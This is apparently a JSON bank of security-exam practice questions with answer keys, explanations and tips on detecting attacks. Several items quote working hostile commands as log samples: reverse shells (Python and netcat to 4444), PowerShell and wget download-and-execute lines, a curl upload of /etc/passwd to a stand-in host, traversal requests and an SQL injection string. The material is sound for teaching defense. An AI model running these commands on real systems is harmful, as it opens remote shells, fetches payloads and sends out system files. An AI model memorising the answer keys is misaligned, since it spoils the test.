      "explanation": "The use of external entity references in XML parsing indicates an XXE attack, which can expose sensitive files or lead to remote code execution.",
      "examTip": "Disable DTD processing in XML parsers to prevent XXE vulnerabilities."
    },
    {
      "id": 52,
      "question": "A security analyst detects the following suspicious command on a Linux host:\n\npython3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"203.0.113.5\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'\n\nWhat is the attacker attempting to achieve?",
      "options": [
        "Establish a reverse shell for remote control",
        "Perform a denial-of-service attack using socket exhaustion",
        "Exfiltrate sensitive data using an encrypted channel",
        "Launch a local privilege escalation exploit"
      ],
      "correctAnswerIndex": 0,
      "explanation": "This Python command sets up a reverse shell connection, allowing the attacker to execute shell commands remotely.",
      "examTip": "Reverse shell patterns often involve socket connections and shell spawning commands—monitor for these indicators."
    },
    {
      "id": 53,
      "question": "An organization detects the following network behavior:\n- Outbound DNS queries to random subdomains\n- No corresponding HTTP/S traffic\n- Queries contain base64-encoded data\n\nWhat is the MOST LIKELY technique being used?",
      "options": [
        "DNS tunneling for data exfiltration",
        "Domain Generation Algorithm (DGA) malware communication",
        "DNS poisoning for redirection to malicious domains",
        "Command-and-control (C2) beaconing via HTTP"
      ],
      "correctAnswerIndex": 0,
      "explanation": "Base64-encoded data in DNS queries without related web traffic typically indicates DNS tunneling for covert data exfiltration or C2 communications.",
      "examTip": "Monitor DNS traffic for encoded payloads and random subdomain patterns to detect DNS tunneling."
    },
    {
      "id": 54,
      "question": "A vulnerability assessment reports that an internal application is vulnerable to SQL injection. The following query is used:\n\nSELECT * FROM users WHERE username = '$user' AND password = '$pass';\n\nWhich secure coding practice BEST mitigates this vulnerability?",
      "options": [
        "Use prepared statements and parameterized queries",
        "Escape user inputs before including them in queries",
        "Apply strict password complexity requirements",
        "Implement client-side validation of form inputs"
      ],
      "correctAnswerIndex": 0,
      "explanation": "Prepared statements ensure user inputs are treated as data, not executable code, thereby preventing SQL injection attacks.",
      "examTip": "Parameterized queries are the most effective defense against SQL injection—always use them in database interactions."
    },
    {
      "id": 55,
      "question": "A red team operator uses the following command:\n\nnc -nv 203.0.113.10 5555 -e /bin/bash\n\nWhat is the MOST LIKELY purpose of this command?",
      "options": [
        "Establishing a reverse shell to gain remote control",
        "Conducting port scanning on the target host",
        "Executing a file download over a TCP connection",
        "Enumerating open services on the target network"
      ],
      "correctAnswerIndex": 0,
      "explanation": "The Netcat (`nc`) command with `-e /bin/bash` establishes a reverse shell, giving the attacker remote shell access over TCP port 5555.",
      "examTip": "Reverse shell detection often involves unusual outbound connections on uncommon ports—monitor these closely."
    },
    {
      "id": 56,
      "question": "A web application does not properly validate file uploads. An attacker uploads a PHP file containing malicious code disguised with a `.jpg` extension.\n\nWhich vulnerability does this scenario demonstrate?",
      "options": [
        "Unrestricted file upload leading to remote code execution",
        "Cross-site scripting (XSS) via malicious file injection",
        "Directory traversal to access unauthorized files",
        "Insecure deserialization allowing arbitrary code execution"
      ],
      "correctAnswerIndex": 0,
      "explanation": "Unrestricted file upload vulnerabilities occur when applications fail to validate file content and type, potentially leading to remote code execution.",
      "examTip": "Validate file types, use MIME checks, and store uploads in non-executable directories to prevent file upload exploits."
    },
    {
      "id": 57,
      "question": "During a threat hunt, an analyst discovers a PowerShell script containing the following:\n\npowershell.exe -nop -w hidden -c \"IEX(New-Object Net.WebClient).DownloadString('http://malicious-ip.com/payload.ps1')\"\n\nWhat is the attacker's primary objective with this command?",
      "options": [
        "Download and execute a malicious PowerShell script in memory",
        "Establish persistence by modifying system startup settings",
        "Perform credential dumping from LSASS memory",
        "Disable endpoint protection tools for lateral movement"
      ],
      "correctAnswerIndex": 0,
      "explanation": "The command downloads and executes a PowerShell script directly in memory, avoiding disk-based detection—a common fileless malware technique.",
      "examTip": "Look for 'IEX' and 'DownloadString' patterns in PowerShell logs—key indicators of fileless attacks."
    },
    {
      "id": 58,
      "question": "A cloud security audit reveals that S3 buckets storing sensitive data are accessible to the public via URL.\n\nWhat should be the FIRST remediation step?",
      "options": [
        "Remove public access permissions from the S3 buckets",
        "Enable encryption at rest using AWS KMS",
        "Configure VPC endpoints for private S3 access",
        "Enable CloudTrail logging for all S3 access events"
      ],
      "correctAnswerIndex": 0,
      "explanation": "Restricting public access immediately reduces the risk of unauthorized data exposure. Encryption and logging are secondary controls in this context.",
      "examTip": "Public access misconfigurations in cloud environments are critical risks—restrict access immediately."
    },
    {
      "id": 59,
      "question": "A SIEM tool generates alerts for multiple authentication attempts from different global IP addresses within a short time frame for the same user account.\n\nWhich attack technique does this MOST LIKELY indicate?",
      "options": [
        "Credential stuffing",
        "Password spraying",
        "Brute force attack",
        "Pass-the-hash attack"
      ],
      "correctAnswerIndex": 0,
      "explanation": "Credential stuffing involves using stolen credentials across multiple accounts or services. Rapid global login attempts typically indicate this method.",
      "examTip": "Implement multi-factor authentication (MFA) and monitor for abnormal login patterns to prevent credential stuffing."
    },
    {
      "id": 60,
      "question": "An attacker gains unauthorized access to a cloud environment and launches GPU-intensive virtual machines across multiple regions, resulting in unexpected billing charges.\n\nWhat is the MOST LIKELY objective of the attacker?",
      "options": [
        "Cryptocurrency mining (cryptojacking)",
        "Distributed Denial-of-Service (DDoS) attack",
        "Data exfiltration from cloud storage",
        "Phishing infrastructure deployment"
      ],
      "correctAnswerIndex": 0,
      "explanation": "GPU-powered virtual machines are often used by attackers for cryptocurrency mining due to their processing capabilities, resulting in higher cloud costs.",
      "examTip": "Monitor cloud billing and resource usage patterns for unusual spikes—common signs of cryptojacking."
    },
    {
      "id": 61,
      "question": "A security analyst identifies multiple outbound connections from an internal host to various external IP addresses on port 8080 at regular intervals. The data packets are small, and the connections terminate quickly.\n\nWhat is the MOST likely cause of this behavior?",
      "options": [
        "Command-and-control (C2) beaconing",
        "Port scanning for open services",
        "Data exfiltration using HTTP tunneling",
        "Distributed Denial-of-Service (DDoS) attack preparation"
      ],
      "correctAnswerIndex": 0,
      "explanation": "Short, periodic outbound connections to external IPs often indicate C2 beaconing, where malware checks in with its controller for further instructions.",
      "examTip": "Look for repeated, low-data outbound connections to identify C2 beaconing activities."
    },
    {
      "id": 62,
      "question": "A vulnerability scan reveals that a web server is running outdated software with a known remote code execution (RCE) vulnerability. The vendor patch will take two weeks to implement due to operational constraints.\n\nWhich action BEST reduces the risk in the meantime?",
      "options": [
        "Apply virtual patching via a Web Application Firewall (WAF)",
        "Restrict server access to internal users only",
        "Increase monitoring of server logs for exploit attempts",
        "Disable all non-essential services running on the server"
      ],
      "correctAnswerIndex": 0,
      "explanation": "Virtual patching using a WAF can mitigate exploitation risks by blocking known attack patterns while awaiting vendor patches.",
      "examTip": "WAFs provide essential short-term protection for web servers when immediate patching isn't possible."
    },
    {
      "id": 63,
      "question": "An attacker exploits a web application by submitting the following request:\n\nGET /download.php?file=../../../../etc/passwd\n\nWhich type of vulnerability is the attacker attempting to exploit?",
      "options": [
        "Directory traversal",
        "Cross-site request forgery (CSRF)",
        "Remote file inclusion (RFI)",
        "Command injection"
      ],
      "correctAnswerIndex": 0,
      "explanation": "The '../../../../etc/passwd' path manipulation is characteristic of a directory traversal attack aimed at accessing sensitive files.",
      "examTip": "Restrict file path inputs and sanitize user inputs to prevent directory traversal exploits."
    },
    {
      "id": 64,
      "question": "A penetration tester successfully intercepts web traffic and modifies session cookies. After refreshing the page, they gain access to administrative functionality.\n\nWhich vulnerability does this BEST represent?",
      "options": [
        "Session fixation",
        "Cross-site scripting (XSS)",
        "Broken authentication",
        "Cross-site request forgery (CSRF)"
      ],
      "correctAnswerIndex": 0,
      "explanation": "Session fixation occurs when an attacker sets or manipulates a valid session ID, allowing unauthorized access to user sessions.",
      "examTip": "Regenerate session IDs after authentication to prevent session fixation attacks."
    },
    {
      "id": 65,
      "question": "A forensic analyst discovers the following command executed on a compromised system:\n\nwget http://malicious-site.com/payload.sh -O- | bash\n\nWhat was the attacker's objective with this command?",
      "options": [
        "Download and execute a malicious script in a single step",
        "Modify system kernel parameters for privilege escalation",
        "Establish persistent backdoor access via cron jobs",
        "Encrypt sensitive files for ransom purposes"
      ],
      "correctAnswerIndex": 0,
      "explanation": "The command downloads a script and pipes it directly into `bash`, enabling the script to execute immediately without saving it locally.",
      "examTip": "Monitor for suspicious use of 'wget' or 'curl' combined with direct execution commands—common in fileless attacks."
    },
    {
      "id": 66,
      "question": "A cloud administrator identifies that multiple virtual machines have been provisioned across different regions without proper authorization. These instances are utilizing high GPU resources.\n\nWhat is the MOST likely reason for this behavior?",
      "options": [
        "Cryptocurrency mining (cryptojacking)",
        "Distributed Denial-of-Service (DDoS) attack preparation",
        "Cloud infrastructure reconnaissance",
        "Data exfiltration using GPU acceleration"
      ],
      "correctAnswerIndex": 0,
      "explanation": "Attackers commonly use unauthorized GPU-intensive instances for cryptocurrency mining, leading to increased costs for the victim organization.",
      "examTip": "Set budget alerts and monitor cloud resource usage patterns for signs of cryptojacking."
    },
    {
      "id": 67,
      "question": "A web application allows users to upload profile images. A penetration tester uploads a PHP file disguised with a .jpg extension that executes server-side code.\n\nWhich mitigation strategy BEST prevents this type of vulnerability?",
      "options": [
        "Implement strict file validation and content-type checks",
        "Use web application firewalls (WAF) to block file uploads",
        "Encrypt all uploaded files using secure algorithms",
        "Store uploaded files in executable directories"
      ],
      "correctAnswerIndex": 0,
      "explanation": "Strict file validation, including content-type checks, ensures that only legitimate file types are accepted, preventing remote code execution through disguised uploads.",
      "examTip": "Never rely solely on file extensions for validation—verify MIME types and use non-executable storage directories."
    },
    {
      "id": 68,
      "question": "A SOC analyst reviews PowerShell logs and identifies the following command:\n\npowershell.exe -ExecutionPolicy Bypass -NoProfile -c \"IEX (New-Object Net.WebClient).DownloadString('http://evil.com/ps.ps1')\"\n\nWhat is the PRIMARY risk associated with this command?",
      "options": [
        "Fileless malware execution in memory",
        "Credential harvesting using PowerShell modules",
        "Privilege escalation via PowerShell remoting",
        "Persistence establishment using scheduled tasks"
      ],
      "correctAnswerIndex": 0,
      "explanation": "The command downloads and executes a script directly in memory, bypassing execution policies—a common technique used in fileless malware attacks.",
      "examTip": "Monitor PowerShell commands for 'DownloadString' and 'IEX'—strong indicators of fileless attack techniques."
    },
    {
      "id": 69,
      "question": "A vulnerability scan identifies an internal server running SMBv1. The organization’s policy mandates the removal of deprecated protocols.\n\nWhy should SMBv1 be disabled immediately?",
      "options": [
        "It is vulnerable to ransomware attacks like WannaCry",
        "It allows unencrypted data transmission over the network",
        "It enables easy brute force attacks on file shares",
        "It exposes systems to ARP spoofing attacks"
      ],
      "correctAnswerIndex": 0,
      "explanation": "SMBv1 is outdated and was exploited by ransomware like WannaCry, making it a critical security risk that should be disabled.",
      "examTip": "Legacy protocols like SMBv1 are high-priority risks—disable them to prevent known ransomware exploitation vectors."
    },
    {
      "id": 70,
      "question": "A threat hunter observes DNS queries from an internal host to domains like:\n\na1b2c3d4.maliciousdomain.net\nz9y8x7w6.badactor.org\n\nNo corresponding HTTP traffic follows these queries.\n\nWhat is the MOST likely explanation for this behavior?",
      "options": [
        "Malware using a Domain Generation Algorithm (DGA)",
        "Beaconing behavior to a C2 server via DNS tunneling",
        "Reconnaissance activity for identifying active DNS servers",
        "DNS amplification attack preparation"
      ],
      "correctAnswerIndex": 0,
      "explanation": "Randomized DNS queries without follow-up connections typically indicate DGA-based malware attempting to locate active C2 servers.",
      "examTip": "Detecting repeated DNS requests to random subdomains is key in identifying DGA malware operations."
    },
    {
      "id": 71,
      "question": "A security analyst observes the following traffic pattern:\n- Regular outbound connections from an internal host to an external IP on port 4444\n- Each connection lasts only a few seconds\n- Minimal data is transferred during each session\n\nWhat does this behavior MOST LIKELY indicate?",
      "options": [
        "Command-and-control (C2) beaconing",
        "Port scanning for vulnerable services",
        "Lateral movement within the network",
        "Data exfiltration using low-bandwidth channels"
      ],
      "correctAnswerIndex": 0,
      "explanation": "Short, periodic connections with minimal data transfer to port 4444—a port commonly associated with reverse shells—indicate C2 beaconing.",
      "examTip": "C2 beaconing is characterized by low-and-slow outbound traffic patterns to unusual ports."
    },
    {
      "id": 72,
      "question": "A penetration tester uses the following SQL injection payload:\n\nadmin' OR '1'='1'; --\n\nWhat is the PRIMARY goal of this payload?",
      "options": [
        "Bypass authentication controls",
        "Extract sensitive data from the database",
        "Delete user records in the database",
        "Escalate privileges within the application"
      ],
      "correctAnswerIndex": 0,
      "explanation": "The 'OR '1'='1'' condition always evaluates as true, allowing attackers to bypass authentication by tricking the database into granting access.",
      "examTip": "Parameterized queries are the most effective mitigation for SQL injection vulnerabilities."
    },
    {
      "id": 73,
      "question": "A threat hunter notices the following PowerShell command in an endpoint's logs:\n\npowershell.exe -nop -w hidden -enc UABvAHcAZQByAFMAaABlAGwAbA==\n\nWhat is the attacker's LIKELY intent with this command?",
      "options": [
        "Obfuscate malicious code execution using base64 encoding",
        "Harvest credentials from memory using Mimikatz",
        "Disable endpoint protection tools silently",
        "Establish persistence via scheduled PowerShell tasks"
      ],
      "correctAnswerIndex": 0,
      "explanation": "The '-enc' flag specifies that the command is base64-encoded, a common technique to obfuscate commands and bypass security monitoring.",
      "examTip": "Base64-encoded PowerShell commands often indicate obfuscation—look for the '-enc' flag in logs."
    },
    {
      "id": 74,
      "question": "A vulnerability scan reveals that a web server is vulnerable to directory traversal attacks. Which configuration change would BEST mitigate this risk?",
      "options": [
        "Restrict user input and sanitize file paths",
        "Enable TLS 1.3 for all web server communications",
        "Configure firewall rules to block HTTP requests",
        "Disable directory indexing on the web server"
      ],
      "correctAnswerIndex": 0,
      "explanation": "Proper input validation and sanitizing file paths prevent attackers from manipulating file directories to access restricted files.",
      "examTip": "Prevent directory traversal by sanitizing file paths and implementing least privilege file permissions."
    },
    {
      "id": 75,
      "question": "An attacker attempts to upload a file named 'shell.php.jpg' to a web server. The file passes the extension check and gets stored in a web-accessible directory. The attacker then accesses:\n\nhttp://victim.com/uploads/shell.php.jpg\n\nWhat vulnerability has been exploited?",
      "options": [
        "Unrestricted file upload",
        "Cross-site scripting (XSS)",
        "Server-side request forgery (SSRF)",
        "Path traversal attack"
      ],
      "correctAnswerIndex": 0,
      "explanation": "The attacker disguised a PHP file with a .jpg extension, bypassing weak validation. This allows execution of server-side code, demonstrating an unrestricted file upload vulnerability.",
      "examTip": "Validate file content, not just file extensions—use MIME type checks and store uploads in non-executable directories."
    },
    {
      "id": 76,
      "question": "A SIEM generates alerts for multiple failed login attempts for a single user account, followed by a successful login from a new geographic location. Which security control would BEST prevent this scenario?",
      "options": [
        "Multi-factor authentication (MFA)",
        "Geo-location IP blocking",
        "Account lockout policies",
        "Single sign-on (SSO)"
      ],
      "correctAnswerIndex": 0,
      "explanation": "MFA adds an additional authentication layer, preventing unauthorized access even if credentials are compromised.",
      "examTip": "MFA is one of the most effective defenses against credential-based attacks."
    },
    {
      "id": 77,
      "question": "A security analyst detects that a cloud-hosted database is accessible from the internet without authentication. What should be the FIRST action to secure the database?",
      "options": [
        "Restrict access by updating security group rules",
        "Encrypt the database and backups immediately",
        "Enable audit logging to monitor all access attempts",
        "Patch the database to the latest version"
      ],
      "correctAnswerIndex": 0,
      "explanation": "The immediate step should be to restrict public access via firewall or security group rules, preventing unauthorized access.",
      "examTip": "Databases should never be exposed directly to the internet—use security groups and private networks for access control."
    },
    {
      "id": 78,
      "question": "A cloud security engineer discovers that users can upload files to an S3 bucket that serves static website content. What security risk does this pose?",
      "options": [
        "Malicious file uploads could lead to website defacement or malware distribution",
        "Large file uploads could result in excessive storage costs",
        "Unauthorized uploads could expose encryption keys",
        "File uploads could bypass network intrusion prevention systems (IPS)"
      ],
      "correctAnswerIndex": 0,
      "explanation": "Allowing unrestricted file uploads to a publicly accessible bucket serving web content could enable attackers to upload malicious files, risking defacement or malware distribution.",
      "examTip": "Apply strict bucket policies—disable public write access and validate file uploads for web content buckets."
    },
    {
      "id": 79,
      "question": "A forensic analyst reviewing endpoint logs observes:\n\npowershell.exe -ExecutionPolicy Bypass -NoProfile -c \"IEX(New-Object Net.WebClient).DownloadString('http://malicious-ip.com/backdoor.ps1')\"\n\nWhat defensive measure would MOST effectively prevent this attack in the future?",
      "options": [
        "Implement application whitelisting to block unauthorized PowerShell execution",
        "Block outbound HTTP traffic from all endpoints at the firewall",
        "Force PowerShell scripts to run in constrained language mode",
        "Deploy an EDR solution to monitor all PowerShell activity"
      ],
      "correctAnswerIndex": 0,
      "explanation": "Application whitelisting ensures that only authorized PowerShell scripts can execute, preventing unauthorized in-memory executions like the one observed.",
      "examTip": "Application whitelisting is a highly effective defense against fileless malware leveraging PowerShell."
    },
    {
      "id": 80,
      "question": "A penetration tester observes that a web application's session tokens do not expire after logout. What security issue does this behavior introduce?",
      "options": [
        "Session hijacking",
        "Cross-site request forgery (CSRF)",
        "Privilege escalation",
        "Broken access control"
      ],
      "correctAnswerIndex": 0,
      "explanation": "If session tokens remain valid after logout, attackers who obtain them can hijack user sessions and gain unauthorized access.",
      "examTip": "Ensure session tokens are invalidated immediately upon user logout to prevent hijacking."
    },
    {
      "id": 81,
      "question": "A security analyst detects outbound DNS queries containing large, base64-encoded strings from an internal host. The queries occur every hour without corresponding web traffic.\n\nWhat is the MOST LIKELY explanation for this behavior?",
      "options": [
        "DNS tunneling for covert data exfiltration",
        "Domain Generation Algorithm (DGA) for C2 server discovery",
        "DNS cache poisoning attack",
        "Phishing attempt using DNS redirection"
      ],
      "correctAnswerIndex": 0,
      "explanation": "Large, base64-encoded DNS queries at regular intervals are common indicators of DNS tunneling used for covert data exfiltration or C2 communication.",
      "examTip": "Monitor DNS logs for abnormal payload sizes and patterns to detect tunneling activities."
    },
    {
      "id": 82,
      "question": "A web application allows users to reset their passwords by answering security questions. An attacker is able to reset multiple user accounts by correctly guessing answers.\n\nWhich security weakness is MOST responsible for this vulnerability?",
      "options": [
        "Weak account recovery mechanisms",
        "Insecure session management",
        "Improper input validation",
        "Cross-site request forgery (CSRF)"
      ],
      "correctAnswerIndex": 0,
      "explanation": "Weak or easily guessable answers in account recovery processes can lead to unauthorized account resets.",
      "examTip": "Use stronger authentication mechanisms and avoid guessable security questions for account recovery."
    },
    {
      "id": 83,
      "question": "During a red team engagement, the following command is executed:\n\ncurl -X POST -d @/etc/passwd http://malicious-site.com/upload\n\nWhat is the MOST LIKELY objective of the attacker?",
      "options": [
        "Exfiltration of sensitive system files",
        "Privilege escalation by modifying configuration files",
        "Conducting a denial-of-service attack on the web server",
        "Injecting malicious code into system binaries"
      ],
      "correctAnswerIndex": 0,
      "explanation": "The `/etc/passwd` file contains user account information. Posting it to an external server indicates an attempt to exfiltrate sensitive data.",
      "examTip": "Monitor outbound POST requests for transfers involving sensitive files—common exfiltration technique."
    },
    {
      "id": 84,
      "question": "A penetration tester attempts to exploit a web server using the following payload:\n\nhttp://target.com/index.php?file=../../../../etc/shadow\n\nWhich mitigation technique would BEST prevent this exploitation attempt?",
      "options": [
        "Input validation and file path sanitization",
        "Server-side encryption of sensitive files",
        "Enforcing HTTPS for all web traffic",
        "Implementing strict firewall rules for web traffic"
      ],
      "correctAnswerIndex": 0,
      "explanation": "Sanitizing file path inputs prevents directory traversal attacks, which can expose sensitive server files.",
      "examTip": "Always validate user inputs that reference file paths—never trust client-supplied data."
    },
    {
      "id": 85,
      "question": "A cloud audit reveals that an AWS S3 bucket containing sensitive data has public read permissions enabled. No encryption is applied to the data.\n\nWhat should be the FIRST action to mitigate this risk?",
      "options": [
        "Restrict bucket permissions to authorized users only",
        "Enable encryption at rest using AWS KMS",
        "Enable logging to monitor access to the bucket",
        "Configure versioning to protect against accidental deletion"
      ],
      "correctAnswerIndex": 0,
      "explanation": "Restricting public access immediately prevents unauthorized users from accessing sensitive data. Encryption and logging are secondary controls.",
      "examTip": "S3 buckets should have least-privilege permissions—public access should be explicitly justified."
    },
    {
      "id": 86,
      "question": "A threat hunter discovers a scheduled cron job on a Linux server:\n\n* * * * * wget http://malicious.com/script.sh -O- | bash\n\nWhat is the MOST LIKELY purpose of this cron job?",
      "options": [
        "Maintaining persistence by executing malicious code repeatedly",
        "Performing data exfiltration at regular intervals",
        "Monitoring system logs for specific keywords",
        "Escalating privileges through kernel module injections"
      ],
      "correctAnswerIndex": 0,
      "explanation": "The cron job downloads and executes a script every minute, ensuring persistent execution of malicious code on the server.",
      "examTip": "Regularly audit scheduled tasks (cron jobs) for unauthorized or suspicious entries."
    },
    {
      "id": 87,
      "question": "A SIEM generates alerts showing multiple failed login attempts followed by a successful login to a privileged account from a foreign IP address. Shortly after, the same account is used to create new user accounts with administrative privileges.\n\nWhat phase of the cyber kill chain does this MOST LIKELY represent?",
      "options": [
        "Actions on Objectives",
        "Lateral Movement",
        "Initial Access",
        "Privilege Escalation"
      ],
      "correctAnswerIndex": 0,
      "explanation": "Creating privileged accounts after gaining access suggests the attacker is attempting to achieve their final goals, fitting the 'Actions on Objectives' phase.",
      "examTip": "Look for administrative actions and privilege changes after suspicious logins—common in the final attack stages."
    },
    {
      "id": 88,
      "question": "A web server is found to be using TLS 1.0 for encrypted communications. The organization requires PCI DSS compliance.\n\nWhy is this finding considered critical?",
      "options": [
        "TLS 1.0 is deprecated and non-compliant with PCI DSS standards",
        "TLS 1.0 allows attackers to perform man-in-the-middle attacks easily",
        "TLS 1.0 fails to provide adequate protection against brute force attacks",
        "TLS 1.0 does not support modern key exchange algorithms"
      ],
      "correctAnswerIndex": 0,
      "explanation": "PCI DSS requires the use of secure encryption protocols like TLS 1.2 or higher; TLS 1.0 is outdated and considered insecure.",
      "examTip": "Update encryption protocols to TLS 1.2+ for compliance and enhanced security."
    },
    {
      "id": 89,
      "question": "A malware analysis report shows that a sample performs the following:\n- Encrypts user files\n- Displays a ransom note demanding Bitcoin\n- Deletes system shadow copies\n\nWhich type of malware exhibits this behavior?",
      "options": [
        "Ransomware",
        "Rootkit",
        "Worm",
        "Trojan"
      ],
      "correctAnswerIndex": 0,
      "explanation": "Encrypting files and demanding ransom payments is characteristic of ransomware, which often deletes backups to prevent recovery.",
      "examTip": "Regular offline backups and endpoint protection solutions are critical defenses against ransomware."
    },
    {
      "id": 90,
      "question": "A cloud administrator notices that multiple compute instances have been provisioned across different regions without authorization. Resource usage is high, and significant charges have accumulated.\n\nWhat is the MOST LIKELY objective of the attacker?",
      "options": [
        "Cryptocurrency mining (cryptojacking)",
        "Distributed Denial-of-Service (DDoS) attack",
        "Establishing a botnet for future attacks",
        "Exfiltrating sensitive organizational data"
      ],
      "correctAnswerIndex": 0,
      "explanation": "Unauthorized provisioning of high-resource compute instances often indicates cryptojacking, where attackers mine cryptocurrency at the victim's expense.",
      "examTip": "Set budget alerts and implement IAM policies to detect and prevent unauthorized cloud resource usage."
    },
    {
      "id": 91,
      "question": "A forensic analyst reviewing network logs notices that an internal host is sending outbound connections to multiple external IP addresses on port 53 with base64-encoded payloads. No corresponding legitimate DNS queries are observed.\n\nWhat is the MOST LIKELY explanation for this activity?",
      "options": [
        "DNS tunneling for data exfiltration",
        "Distributed Denial-of-Service (DDoS) attack using DNS amplification",
        "Reconnaissance for DNS zone transfers",
        "Man-in-the-middle (MITM) attack on DNS traffic"
      ],
      "correctAnswerIndex": 0,
      "explanation": "Base64-encoded DNS payloads without typical DNS resolution patterns indicate DNS tunneling, often used for covert data exfiltration or C2 communication.",
      "examTip": "Monitor DNS logs for large or encoded payloads—a common sign of DNS tunneling."
    },
    {
      "id": 92,
      "question": "A vulnerability scan identifies an exposed SMBv1 service on a critical internal file server. The organization recently experienced a ransomware attack linked to SMB vulnerabilities.\n\nWhat is the MOST immediate action to reduce the risk of exploitation?",
      "options": [
        "Disable SMBv1 on the file server",
        "Patch the file server with the latest security updates",
        "Segment the file server from untrusted network segments",
        "Enable host-based firewalls on all endpoints"
      ],
      "correctAnswerIndex": 0,
      "explanation": "SMBv1 is deprecated and highly vulnerable, especially to ransomware like WannaCry. Disabling SMBv1 immediately reduces the attack surface.",
      "examTip": "Legacy protocols like SMBv1 are major risks—disable them wherever possible."
    },
    {
      "id": 93,
      "question": "A penetration tester discovers a parameter in a web application that allows user-controlled file downloads. By modifying the parameter, the tester successfully retrieves '/etc/passwd' from the server.\n\nWhich vulnerability does this BEST represent?",
      "options": [
        "Directory traversal",
        "Local file inclusion (LFI)",
        "Remote file inclusion (RFI)",
        "Cross-site request forgery (CSRF)"
      ],
      "correctAnswerIndex": 0,
      "explanation": "The ability to manipulate file paths to access unauthorized files demonstrates a directory traversal vulnerability.",
      "examTip": "Sanitize and validate user input for file paths to prevent directory traversal attacks."
    },
    {
      "id": 94,
      "question": "A SOC analyst notices multiple authentication attempts for a privileged account originating from various IP addresses worldwide within a short period. The login attempts are successful using the correct credentials.\n\nWhat type of attack is MOST LIKELY occurring?",
      "options": [
        "Credential stuffing",
        "Password spraying",
        "Brute force attack",
        "Pass-the-hash attack"
      ],
      "correctAnswerIndex": 0,
      "explanation": "Credential stuffing involves using known credentials from data breaches across multiple services or locations, matching the observed global login attempts.",
      "examTip": "Implement multi-factor authentication (MFA) and monitor for unusual login patterns to prevent credential stuffing."
    },
    {
      "id": 95,
      "question": "A threat intelligence report states that a known APT group uses PowerShell with base64-encoded commands to evade detection. A SOC analyst finds the following in logs:\n\npowershell.exe -nop -w hidden -enc SQBtAG0AbwByAHQAIABwAG8AcwB0AHM=\n\nWhat is the MOST LIKELY objective of this command?",
      "options": [
        "Obfuscate malicious PowerShell commands for execution",
        "Dump credentials from LSASS memory",
        "Establish persistence by creating scheduled tasks",
        "Download and execute remote payloads in memory"
      ],
      "correctAnswerIndex": 0,
      "explanation": "The '-enc' flag specifies a base64-encoded command, commonly used to obfuscate PowerShell commands and evade detection.",
      "examTip": "Investigate PowerShell logs for base64-encoded commands—these often indicate obfuscation attempts."
    },
    {
      "id": 96,
      "question": "A cloud storage bucket containing sensitive information is found to have public write permissions. What is the MOST significant risk posed by this misconfiguration?",
      "options": [
        "Attackers could upload malicious content for distribution",
        "Unauthorized users could download sensitive data",
        "The cloud provider could suspend the account for policy violations",
        "Users could accidentally overwrite existing data"
      ],
      "correctAnswerIndex": 0,
      "explanation": "Public write access allows attackers to upload malicious files, which could lead to malware distribution or defacement.",
      "examTip": "Enforce least-privilege access policies for cloud storage—public write permissions should be avoided."
    },
    {
      "id": 97,
      "question": "A penetration tester runs the following Netcat command:\n\nnc -lvp 4444 -e /bin/bash\n\nWhat is the purpose of this command?",
      "options": [
        "Set up a reverse shell listener for remote access",
        "Conduct a port scan on the local network",
        "Transfer a file from a remote server to the local host",
        "Encrypt a communication channel between two endpoints"
      ],
      "correctAnswerIndex": 0,
      "explanation": "The Netcat (`nc`) command sets up a listener on port 4444 that executes `/bin/bash`, enabling a reverse shell for remote access.",
      "examTip": "Monitor for unexpected Netcat listeners—often used for reverse shells in penetration tests or attacks."
    },
    {
      "id": 98,
      "question": "A vulnerability scan identifies that a web application uses predictable session tokens. What attack could this MOST LIKELY enable?",
      "options": [
        "Session hijacking",
        "Cross-site scripting (XSS)",
        "SQL injection",
        "Clickjacking"
      ],
      "correctAnswerIndex": 0,
      "explanation": "Predictable session tokens can be guessed by attackers, enabling session hijacking and unauthorized access to user sessions.",
      "examTip": "Ensure session tokens are randomly generated and securely transmitted to prevent hijacking risks."
    },
    {
      "id": 99,
      "question": "A cloud infrastructure assessment reveals the following:\n- Multiple API keys hard-coded in public GitHub repositories\n- These keys provide administrative access to cloud resources\n\nWhat is the MOST appropriate immediate action?",
      "options": [
        "Revoke exposed API keys and rotate them immediately",
        "Configure firewall rules to block unauthorized cloud access",
        "Implement encryption for all cloud-stored data",
        "Enable multi-factor authentication (MFA) for API access"
      ],
      "correctAnswerIndex": 0,
      "explanation": "Hard-coded, publicly exposed API keys must be revoked and rotated immediately to prevent unauthorized access to cloud resources.",
      "examTip": "Never hard-code sensitive credentials—use environment variables and secrets management solutions instead."
    },
    {
      "id": 100,
      "question": "A malware sample exhibits the following behavior in a sandbox:\n- Creates scheduled tasks for execution at startup\n- Disables endpoint protection services\n- Establishes outbound connections to a known malicious IP on port 8080\n\nWhich type of malware is MOST LIKELY responsible for this behavior?",
      "options": [
        "Trojan providing persistent remote access",
        "Rootkit hiding malicious activities at the kernel level",
        "Worm propagating through network vulnerabilities",
        "Ransomware encrypting files and demanding payment"
      ],
      "correctAnswerIndex": 0,
      "explanation": "The creation of scheduled tasks for persistence, disabling of security tools, and C2 communication are typical behaviors of a Trojan designed for persistent remote access.",
      "examTip": "Persistence mechanisms combined with C2 communication strongly suggest Trojan activity—monitor for such patterns."
    }
  ]
});
